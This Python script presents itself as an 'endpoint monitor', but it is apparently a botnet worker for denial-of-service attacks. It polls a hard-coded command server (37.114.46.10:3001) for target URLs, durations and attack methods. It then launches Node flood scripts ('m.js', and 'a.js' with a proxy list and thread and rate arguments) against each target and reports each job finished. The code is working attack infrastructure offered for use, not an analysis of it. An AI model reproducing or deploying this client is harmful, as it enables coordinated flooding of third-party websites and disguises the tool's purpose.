import requests
import json
import time
import subprocess
import threading
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('monitor.log'),
        logging.StreamHandler()
    ]
)

class EndpointMonitor:
    def __init__(self, base_url, username, check_interval=5):
        """
        Initialize the monitor
        
        Args:
            base_url: Base URL of the server (e.g., http://127.0.0.1:3001)
            username: Username to monitor (e.g., 'john')
            check_interval: How often to check for new items (seconds)
        """
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.check_interval = check_interval
        self.endpoint_url = f"{self.base_url}/{self.username}"
        self.removal_url = f"{self.base_url}/{self.username}/done"
        self.processed_items = set()  # Track processed items to avoid duplicates
        self.running = True
        self.active_processes = []  # Track active subprocesses
        
    def fetch_active_items(self):
        """Fetch active items from the endpoint"""
        try:
            response = requests.get(self.endpoint_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    connections = data.get('connections', [])
                    return connections
                else:
                    logging.error(f"API returned error: {data.get('message', 'Unknown error')}")
                    return []
            else:
                logging.error(f"HTTP {response.status_code}: {response.text}")
                return []
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return []
    
    def extract_item_key(self, item):
        """Create a unique key for each item"""
        if 'url' in item:
            # New format: url, time, method
            return f"{item.get('url')}_{item.get('time')}_{item.get('method')}"
        else:
            # Legacy format: ip, port, time
            return f"{item.get('ip')}_{item.get('port')}_{item.get('time')}"
    
    def execute_method_1(self, url, time_param, item_key):
        """Execute command for method 1"""
        # Convert time to integer if possible
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60  # Default to 60 seconds if conversion fails
            
        command = [
            "node", "m.js", url, str(time_int), "1", "1", "1"
        ]
        
        logging.info(f"Method 1 - Executing: {' '.join(command)}")
        
        try:
            # Run the command
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Store process reference
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 1
            })
            
            # Start a thread to read output
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 1 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            # Schedule removal after 4 seconds
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 1 command: {e}")
            return None
    
    def execute_method_2(self, url, time_param, item_key):
        """Execute command for method 2"""
        # Convert time to integer if possible
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60  # Default to 60 seconds if conversion fails
            
        command = [
            "node", "a.js", url, str(time_int), "proxy.txt", "4", "100" ,"--full" ,"--debug"
        ]
        
        logging.info(f"Method 2 - Executing: {' '.join(command)}")
        
        try:
            # Run the command
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Store process reference
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 2
            })
            
            # Start a thread to read output
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 2 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            # Schedule removal after 4 seconds
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 2 command: {e}")
            return None
    
    def remove_item(self, url, time_param, item_key):
        """Remove item from the server after execution"""
        try:
            # For new format (url, time, method)
            removal_params = {
                'url': url,
                'time': time_param
            }
            
            response = requests.get(f"{self.base_url}/{self.username}/visitors", params=removal_params)
            
            if response.status_code == 200:
                logging.info(f"Removed item: {item_key}")
            else:
                logging.warning(f"Failed to remove item {item_key}: HTTP {response.status_code}")
                
        except Exception as e:
            logging.error(f"Error removing item {item_key}: {e}")
    
    def cleanup_old_processes(self):
        """Clean up completed processes from tracking list"""
        current_time = datetime.now()
        self.active_processes = [
            p for p in self.active_processes 
            if p['process'].poll() is None  # Process is still running
            or (current_time - p['start_time']).total_seconds() < 300  # Or less than 5 minutes old
        ]
    
    def monitor_loop(self):
        """Main monitoring loop"""
        logging.info(f"Starting monitor for {self.endpoint_url}")
        logging.info(f"Check interval: {self.check_interval} seconds")
        
        while self.running:
            try:
                # Clean up old processes
                self.cleanup_old_processes()
                
                # Fetch current active items
                items = self.fetch_active_items()
                
                if items:
                    logging.info(f"Found {len(items)} active item(s)")
                    
                    for item in items:
                        item_key = self.extract_item_key(item)
                        
                        # Skip if already processed
                        if item_key in self.processed_items:
                            continue
                        
                        # Process based on item type
                        if 'url' in item and 'method' in item:
                            # New format: url, time, method
                            url = item['url']
                            time_param = item['time']
                            method = item['method']
                            
                            logging.info(f"New item detected: {url} | Time: {time_param} | Method: {method}")
                            
                            # Mark as processed
                            self.processed_items.add(item_key)
                            
                            # Execute based on method
                            if str(method) == '1':
                                self.execute_method_1(url, time_param, item_key)
                            elif str(method) == '2':
                                self.execute_method_2(url, time_param, item_key)
                            else:
                                logging.warning(f"Unknown method: {method} for item {item_key}")
                        else:
                            # Legacy format: ip, port, time (skip or handle differently)
                            logging.info(f"Legacy item detected: {item}")
                            self.processed_items.add(item_key)
                
                # Wait before next check
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                logging.info("Received keyboard interrupt, shutting down...")
                self.stop()
                break
            except Exception as e:
                logging.error(f"Error in monitor loop: {e}")
                time.sleep(self.check_interval)
    
    def stop(self):
        """Stop the monitor and cleanup"""
        self.running = False
        logging.info("Stopping monitor...")
        
        # Terminate all running processes
        for proc_info in self.active_processes:
            try:
                proc_info['process'].terminate()
                logging.info(f"Terminated process for {proc_info['item_key']}")
            except:
                pass
        
        # Wait a bit for processes to terminate
        time.sleep(2)
        
        # Force kill any remaining processes
        for proc_info in self.active_processes:
            try:
                if proc_info['process'].poll() is None:
                    proc_info['process'].kill()
            except:
                pass

def main():
    """Main function"""
    # Configuration
    BASE_URL = "http://37.114.46.10:3001"
    USERNAME = "team"
    CHECK_INTERVAL = 5  # seconds
    
    # Create monitor instance
    monitor = EndpointMonitor(BASE_URL, USERNAME, CHECK_INTERVAL)
    
    try:
        # Start monitoring
        monitor.monitor_loop()
    except KeyboardInterrupt:
        monitor.stop()
        logging.info("Monitor stopped by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        monitor.stop()
        sys.exit(1)

if __name__ == "__main__":
    # Check if m.js exists
    if not os.path.exists("m.js"):
        logging.warning("Warning: m.js file not found in current directory")
        logging.info("Current directory: " + os.getcwd())
        logging.info("Please ensure m.js is in the same directory as this script")
    
    main()
